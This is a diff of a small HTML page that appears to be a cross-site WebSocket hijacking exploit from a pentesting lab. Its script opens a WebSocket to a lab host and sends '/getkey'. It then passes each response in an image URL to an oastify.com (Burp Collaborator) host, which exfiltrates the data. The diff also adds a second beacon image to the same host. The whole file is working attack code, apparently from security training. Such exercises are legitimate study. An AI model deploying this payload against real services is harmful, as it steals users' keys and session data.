@@ -1,14 +1,15 @@
 <html>
-<body>
-<script>
-var uri      = "ws://ptl-524eda3b-76481dad.libcurl.so/";
-var ws       = new WebSocket(uri);
+	<body>
+	<script>
+var uri = "ws://ptl-524eda3b-76481dad.libcurl.so/";
+var ws = new WebSocket(uri);
 ws.onmessage = function(message) {
 	var data = JSON.parse(message.data);
 	document.write('<img src="http://wqqer0crn4vz7bow0vvub8oq9hf83yrn.oastify.com/?data='+data.text+'"/>');
 }
 
 ws.onopen = () => ws.send(JSON.stringify({  text: "/getkey" }));
-</script>
-</body>
+	</script>
+		<img src="http://wqqer0crn4vz7bow0vvub8oq9hf83yrn.oastify.com/"/>
+	</body>
 </html>
